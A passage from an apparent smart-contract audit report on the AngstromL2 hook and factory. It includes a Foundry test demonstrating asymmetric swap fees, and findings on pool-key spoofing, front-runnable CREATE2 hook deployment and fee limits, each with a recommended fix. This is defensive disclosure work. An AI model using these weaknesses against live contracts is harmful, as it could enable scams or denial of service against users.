        }

        bumpBlock();


        uint output3;
        // Case 3: oneForZero exactIn (Token input, ETH output)
        uint256 fee3;
        {
            MockERC20 tkn = new MockERC20();
            tkn.mint(address(router), 1e30);
            PoolKey memory key = _createHighLiquidityPool(tkn);

            console.log("Case 3: oneForZero exactIn (Token->ETH)");

            uint256 feeBefore = address(angstrom).balance;
            BalanceDelta delta = router.swap(key, false, -swapAmount, TickMath.MAX_SQRT_PRICE - 1);
            uint256 feeAfter = address(angstrom).balance;
            fee3 = feeAfter - feeBefore;

            //@audit save output to reuse in exactOut swap
            output3 = uint256(int256(delta.amount0()));

            console.log("  Tokens in: %d, ETH out: %d", uint256(-int256(delta.amount1())), uint256(int256(delta.amount0())));
            console.log("  Creator fee (ETH): %d\n", fee3);
        }

        bumpBlock();

        // Case 4: oneForZero exactOut - request same ETH output as Case 3
        uint256 fee4;
        {
            MockERC20 tkn = new MockERC20();
            tkn.mint(address(router), 1e30);
            PoolKey memory key = _createHighLiquidityPool(tkn);

            console.log("Case 4: oneForZero exactOut (want ~same ETH as Case 3)");

            uint256 feeBefore = tkn.balanceOf(address(angstrom));
            BalanceDelta delta = router.swap(key, false, int256(output3), TickMath.MAX_SQRT_PRICE - 1);
            uint256 feeAfter = tkn.balanceOf(address(angstrom));
            fee4 = feeAfter - feeBefore;

            console.log("  Tokens in: %d, ETH out: %d", uint256(-int256(delta.amount1())), uint256(int256(delta.amount0())));
            console.log("  Creator fee (tokens): %d\n", fee4);
        }

        console.log("=== Fee Comparison (at ~1:1 price, fees should be similar) ===");
        console.log("Case 1 (zeroForOne exactIn):  %d tokens", fee1);
        console.log("Case 2 (zeroForOne exactOut): %d ETH", fee2);
        console.log("Case 3 (oneForZero exactIn):  %d ETH", fee3);
        console.log("Case 4 (oneForZero exactOut): %d tokens", fee4);

        console.log("\nIf consistent, all fees should be ~equal at 1:1 price");
        console.log("Discrepancy indicates asymmetric fee calculation");
    }
}
```

#### Test Output

```
=== Fee Comparison (at ~1:1 price, fees should be similar) ===
  Case 1 (zeroForOne exactIn):  50489999999362689 tokens
  Case 2 (zeroForOne exactOut): 50999999999935625 ETH
  Case 3 (oneForZero exactIn):  98999999997549749 ETH
  Case 4 (oneForZero exactOut): 99999999999752500 tokens
```

### Recommendation

Unfortunately, to fix this, one would need to considerably complexify the swap fee logic:

- Take the fee from input as done in Uniswap
- When input is specified, the hook swap fee should be a specified delta in `beforeSwap` (after swap tax has been removed)
- When output is specified, the hook swap fee should be an unspecified delta in `afterSwap` (before swap tax has been added)

### Fix Review

#### Sorella Labs

Fixed in 5fe36ee4.

#### Cergyk

Fixed.


## L-1: AngstromL2::initializeNewPool `key.hooks` is unchecked for a pool attached by owner

### Description

When an `AngstromL2` hook is first deployed by `AngstromL2Factory`, a pool is initialized, and its `key.hooks` variable is set to the newly deployed `AngstromL2`.
Later, the owner of the `AngstromL2` address can attach additional pools to the hook, but now the variable `key.hooks` is not checked to be the `AngstromL2` address.

Fortunately, since `AngstromL2` is protected against having external pools being initialized to it:
[AngstromL2.sol#L201-L203](https://github.com/SorellaLabs/l2-angstrom/blob/8714af691ddc6b2a393950db6fd98b14578911a9/src/AngstromL2.sol#L201-L203):
```solidity
function beforeInitialize(address, PoolKey calldata, uint160) external pure returns (bytes4) {
    revert Unauthorized();
}
```

It is not possible to register a pool that has an `AngstromL2` `A` hook to an `AngstromL2` `B` hook. It is only possible to attach an unrelated hook.

The impact of this issue mostly relies on how the impacted view variables (`AngstromL2::poolKeys`, `AngstromL2Factory::hookPoolIds`) are used in the global infrastructure.

[src/AngstromL2.sol#L94-L99](https://github.com/SorellaLabs/l2-angstrom/blob/8714af691ddc6b2a393950db6fd98b14578911a9/src/AngstromL2.sol#L94-L99):
```solidity
    //@audit malicious pool key is added to pool fee configurations
    mapping(PoolId id => PoolFeeConfiguration) internal _poolFeeConfiguration;

    tuint256 internal liquidityBeforeSwap;
    tbytes32 internal slot0BeforeSwapStore;

    //@audit malicious pool key is added to pool keys list
    PoolKey[] public poolKeys;
```

[src/AngstromL2Factory.sol#L54-L55](https://github.com/SorellaLabs/l2-angstrom/blob/8714af691ddc6b2a393950db6fd98b14578911a9/src/AngstromL2Factory.sol#L54-L55):
```solidity
    AngstromL2[] public allHooks;
    //@audit malicious pool key is added to hook pool ids
    mapping(PoolId id => AngstromL2 hook) public hookPoolIds;
```

Since these variables can be corrupted, hook owners may be able to spoof malicious pools as legitimate in web apps and conduct scams.

### Recommendation

Check `key.hooks` in `initializeNewPool`:

[AngstromL2.sol#L164-L172](https://github.com/SorellaLabs/l2-angstrom/blob/8714af691ddc6b2a393950db6fd98b14578911a9/src/AngstromL2.sol#L164-L172):
```diff
    function initializeNewPool(
        PoolKey calldata key,
        uint160 sqrtPriceX96,
        uint24 creatorSwapFeeE6,
        uint24 creatorTaxFeeE6
    ) public {
        if (!(msg.sender == owner() || msg.sender == FACTORY)) {
            revert Unauthorized();
        }
+   require(address(key.hooks) == address(this), "Pool hook is not address(this)");
```

### Fix Review

#### Sorella Labs

Fixed in f31cbd7b.

#### Cergyk

Fixed.

## L-2: MAX_DEFAULT_PROTOCOL_FEE_MULTIPLE_E6 is overly permissive, should be below 1e6

### Description

The default protocol swap fee (denoted $f_{protocol}$) is defined as a multiple of the aggregate swap fee ($f_{agg}$):

$$f_{agg} = (1 - (1 - f_{lp}){(1 - f_{creator} - f_{protocol})})$$

Since the protocol fee is included in the aggregate swap fee, it does not make sense to have a value of more than 1 for the multiplier:

[AngstromL2Factory.sol#L50](https://github.com/SorellaLabs/l2-angstrom/blob/8714af691ddc6b2a393950db6fd98b14578911a9/src/AngstromL2Factory.sol#L50):
```solidity
uint24 internal constant MAX_DEFAULT_PROTOCOL_FEE_MULTIPLE_E6 = 3.0e6; // 3x or 300%
```

### Recommendation

Given the way the default protocol fee is computed, it would make sense to restrict the multiplier to be below a reasonable value, such as 50%.

### Fix Review

#### Sorella Labs

Fixed in 01d118b2.

#### Cergyk

Fixed.


## INFO-1: CompensationPriceFinder `getZeroForOne` and `getOneForZero` should have same signatures

### Description

The functions `getZeroForOne` and `getOneForZero` in `CompensationPriceFinder`, have an almost fully symmetrical functionality, and as such it is surprising that they have different signatures:

[CompensationPriceFinder.sol#L23-L29](https://github.com/SorellaLabs/l2-angstrom/blob/main/src/libraries/CompensationPriceFinder.sol#L23-L29):
```solidity
function getZeroForOne(
    TickIteratorDown memory ticks,
    uint128 liquidity,
    uint256 taxInEther,
    uint160 priceUpperSqrtX96,
    Slot0 slot0AfterSwap
) internal view returns (int24 lastTick, uint160 pstarSqrtX96) {
```

[CompensationPriceFinder.sol#L99-L105](https://github.com/SorellaLabs/l2-angstrom/blob/main/src/libraries/CompensationPriceFinder.sol#L99-L105):
```solidity
function getOneForZero(
    TickIteratorUp memory ticks,
    uint128 liquidity,
    uint256 taxInEther,
    //@audit full slot value is passed instead of only price as in getZeroForOne
    Slot0 slot0BeforeSwap,
    Slot0 slot0AfterSwap
) internal view returns (int24 lastTick, uint160 pstarSqrtX96) {
```

### Recommendation

One could only provide the price in getOneForZero, like in getZeroForOne:

[CompensationPriceFinder.sol#L99-L105](https://github.com/SorellaLabs/l2-angstrom/blob/main/src/libraries/CompensationPriceFinder.sol#L99-L105):
```diff
function getOneForZero(
    TickIteratorUp memory ticks,
    uint128 liquidity,
    uint256 taxInEther,
    //@audit full slot value is passed instead of only price as in getZeroForOne
-   Slot0 slot0BeforeSwap,
+   uint160 priceLowerSqrtX96,
    Slot0 slot0AfterSwap
) internal view returns (int24 lastTick, uint160 pstarSqrtX96) {
```

### Fix Review

#### Sorella Labs

Fixed in 96e7987f.

#### Cergyk

Fixed.


## INFO-2: Hooks deployment through the factory can be front-run

### Description

`AngstromL2Factory` deploys hooks deterministically by using CREATE2, but the generated address (when the seed is mined through the `HuffMiner`) only depends on the initcode (`AngstromL2.creationCode`), owner address, and the block number.

This means that any owner can only deploy a hook once per block when using the method `createNewHookAndPoolWithMiner`. Furthermore, any user can deploy the hook on their behalf with different parameters.


### Impact
This can be used to DOS the creation of pools for some users for a few blocks (when using `createNewHookAndPoolWithMiner`)

### Recommendation

Consider letting the user specify the initial seed instead of taking the block number

### Fix Review

#### Sorella Labs

Acknowledged and documented in 8705b6c9.

#### Cergyk

Acknowledged.

## INFO-3: Minor code suggestions

### Typos

```diff
- function pullWidthrawOnly() public {
+ function pullWithdrawOnly() public {
    _cachedWithdrawOnly = IFactory(FACTORY).withdrawOnly();
}
```

### Fix Review

#### Sorella Labs

Fixed in 0d2d6879.

#### Cergyk

Fixed.